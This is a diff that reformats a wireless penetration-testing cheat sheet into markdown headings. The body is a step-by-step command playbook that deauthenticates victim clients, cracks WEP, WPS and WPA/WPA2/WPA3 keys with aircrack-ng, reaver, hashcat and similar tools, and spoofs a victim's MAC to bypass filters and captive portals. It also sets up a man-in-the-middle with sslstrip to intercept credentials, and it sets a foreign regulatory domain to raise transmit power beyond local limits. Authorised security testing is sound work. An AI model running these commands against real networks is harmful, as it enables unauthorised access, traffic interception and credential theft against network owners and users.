@@ -1,9 +1,9 @@
-Wireless Penetration Testing Cheat Sheet
+# Wireless Penetration Testing Cheat Sheet
 Current Date - March 03, 2025
 
 Note - Commands assume a Linux environment (e.g., Kali Linux) with tools like aircrack-ng, reaver, pyrit, hashcat, etc., installed. Replace wlan0/wlan0mon with your wireless interface. Ensure your adapter supports monitor mode and packet injection (e.g., Alfa AWUS036NHA).
 
-PREPARATION
+## PREPARATION
 Verify Wireless Interface
 Check available interfaces
 
@@ -28,7 +28,7 @@ iwconfig wlan0mon mode monitor
 
 ifconfig wlan0mon up
 
-Increase Wi-Fi TX Power (Optional)
+## Increase Wi-Fi TX Power (Optional)
 Set regulatory domain (e.g., Bolivia for higher power)
 
 iw reg set BO
@@ -39,12 +39,12 @@ iwconfig wlan0mon txpower 30 - 30 dBm if supported
 
 iwconfig - Verify
 
-Change Wi-Fi Channel
+## Change Wi-Fi Channel
 Set specific channel (1-14 for 2.4 GHz, higher for 5 GHz)
 
 iwconfig wlan0mon channel <Channel>
 
-WIRELESS RECONNAISSANCE
+## WIRELESS RECONNAISSANCE
 Scan for Networks
 Broad scan (all channels, 2.4/5 GHz)
 
@@ -58,7 +58,7 @@ Output saved as <FileName-01.cap> (PCAP format)
 
 Note encryption type (WEP/WPA/WPA2/WPA3)
 
-Find Hidden SSID
+## Find Hidden SSID
 Deauthenticate clients to reveal SSID
 
 airodump-ng -c <Channel> --bssid <BSSID> wlan0mon
@@ -67,12 +67,12 @@ aireplay-ng -0 20 -a <BSSID> -c <VictimMac> wlan0mon
 
 Watch airodump-ng for SSID to appear
 
-Identify Victim MAC
+## Identify Victim MAC
 From airodump-ng output, note client MAC under "STATION" column
 
 Filter active clients with strong signal
 
-WEP CRACKING
+## WEP CRACKING
 Method 1 - Fake Authentication Attack
 airmon-ng start wlan0
 
@@ -88,7 +88,7 @@ aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <BSSID> -h <OurMac> wlan0mon
 
 aircrack-ng -b <BSSID> <FileName-01.cap>
 
-Method 2 - ARP Replay Attack
+### Method 2 - ARP Replay Attack
 airmon-ng start wlan0
 
 airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -99,7 +99,7 @@ aireplay-ng -3 -x 1000 -n 1000 -b <BSSID> -h <OurMac> wlan0mon
 
 aircrack-ng -b <BSSID> <FileName-01.cap>
 
-Method 3 - Chop Chop Attack
+### Method 3 - Chop Chop Attack
 airmon-ng start wlan0
 
 airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -118,7 +118,7 @@ aireplay-ng -2 -r <FileName2> wlan0mon
 
 aircrack-ng <FileName-01.cap>
 
-Method 4 - Fragmentation Attack
+### Method 4 - Fragmentation Attack
 airmon-ng start wlan0
 
 airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -137,7 +137,7 @@ aireplay-ng -2 -r <FileName2> wlan0mon
 
 aircrack-ng <FileName-01.cap>
 
-Method 5 - SKA (Shared Key Authentication) Cracking
+### Method 5 - SKA (Shared Key Authentication) Cracking
 airmon-ng start wlan0
 
 airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -156,7 +156,7 @@ aireplay-ng --deauth 1 -a <BSSID> -h <FakedMac> wlan0mon
 
 aircrack-ng <FileName-01.cap>
 
-WPA/WPA2 CRACKING
+#### WPA/WPA2 CRACKING
 Method 1 - WPS Attack
 Check for WPS-enabled APs
 
@@ -172,7 +172,7 @@ reaver -i wlan0mon -c <Channel> -b <BSSID> -p <PinCode> -vv -S
 
 Note - AP must support WPS; use --delay or --lock-delay if locked out
 
-Method 2 - Dictionary Attack (aircrack-ng)
+### Method 2 - Dictionary Attack (aircrack-ng)
 airmon-ng start wlan0
 
 airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -181,7 +181,7 @@ aireplay-ng -0 10 -a <BSSID> -c <VictimMac> wlan0mon - Capture handshake
 
 aircrack-ng -w <WordlistFile> -b <BSSID> <FileName-01.cap>
 
-Method 3 - Crack with Hashcat (Modern GPU Attack)
+### Method 3 - Crack with Hashcat (Modern GPU Attack)
 airmon-ng start wlan0
 
 airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -200,7 +200,7 @@ Show cracked key
 
 hashcat -m 2500 <FileName>.hccapx --show
 
-Method 4 - Crack with John The Ripper
+### Method 4 - Crack with John The Ripper
 airmon-ng start wlan0
 
 airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -215,7 +215,7 @@ cd /pentest/passwords/john
 
 ./john --wordlist=<Wordlist> --rules <JohnFile>
 
-Method 5 - Crack with coWPAtty
+### Method 5 - Crack with coWPAtty
 airmon-ng start wlan0
 
 airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -230,7 +230,7 @@ genpmk -s <ESSID> -f <Wordlist> -d <HashesFileName>
 
 cowpatty -r <FileName-01.cap> -d <HashesFileName> -s <ESSID>
 
-Method 6 - Crack with Pyrit
+### Method 6 - Crack with Pyrit
 Prerequisite - Install Pyrit with GPU support (apt-get install pyrit)
 
 airmon-ng start wlan0
@@ -251,7 +251,7 @@ pyrit batch
 
 pyrit -r <FileName-01.cap> attack_db
 
-Method 7 - Precomputed WPA Keys Database Attack
+### Method 7 - Precomputed WPA Keys Database Attack
 airmon-ng start wlan0
 
 airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -274,11 +274,11 @@ airolib-ng NEW_DB --verify all
 
 aircrack-ng -r NEW_DB <FileName-01.cap>
 
-WPA3 CONSIDERATIONS (Limited as of 2025)
-Reconnaissance
+#### WPA3 CONSIDERATIONS (Limited as of 2025)
+### Reconnaissance
 Check for WPA3 with airodump-ng (shows "WPA3" or "SAE" in encryption)
 
-Dragonfly Handshake Attack
+### Dragonfly Handshake Attack
 Capture handshake
 
 airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -295,7 +295,7 @@ hashcat -m 22000 -a 0 <FileName>.hc22000 <WordlistFile>
 
 Note - WPA3 is resistant; success depends on weak passwords
 
-BYPASS DEFENSES
+### BYPASS DEFENSES
 Bypass MAC Filtering
 airmon-ng start wlan0
 
@@ -311,7 +311,7 @@ ifconfig wlan0mon up
 
 aireplay-ng -3 -b <BSSID> -h <FakedMac> wlan0mon
 
-Bypass Open Network (Captive Portal)
+### Bypass Open Network (Captive Portal)
 Connect to open AP
 
 iwconfig wlan0 essid <ESSID>
@@ -324,7 +324,7 @@ macchanger --mac <VictimMac> wlan0
 
 Use browser to bypass portal or intercept creds with MITM
 
-MAN-IN-THE-MIDDLE (MITM) ATTACK
+### MAN-IN-THE-MIDDLE (MITM) ATTACK
 Prerequisite - Install bridge-utils (apt-get install bridge-utils)
 
 airmon-ng start wlan0
@@ -353,7 +353,7 @@ Optional - SSLstrip or intercept creds
 
 sslstrip -l 8080 &
 
-POST-EXPLOITATION
+### POST-EXPLOITATION
 Connect to Network (WEP)
 ifconfig wlan0mon down
 
@@ -378,10 +378,10 @@ wpa_supplicant -i wlan0 -c wpa.conf &
 
 dhclient wlan0
 
-Connect to Network (WPA3)
+#### Connect to Network (WPA3)
 Same as WPA2, use cracked key in wpa_supplicant
 
-Cleanup
+### Cleanup
 Stop monitor mode
 
 airmon-ng stop wlan0mon
@@ -390,7 +390,7 @@ ifconfig wlan0 up
 
 service network-manager restart
 
-TROUBLESHOOTING
+#### TROUBLESHOOTING
 Monitor mode fails - Verify adapter supports monitor mode (iw list)
 
 No handshake captured - Increase deauth count (-0 20) or target multiple clients
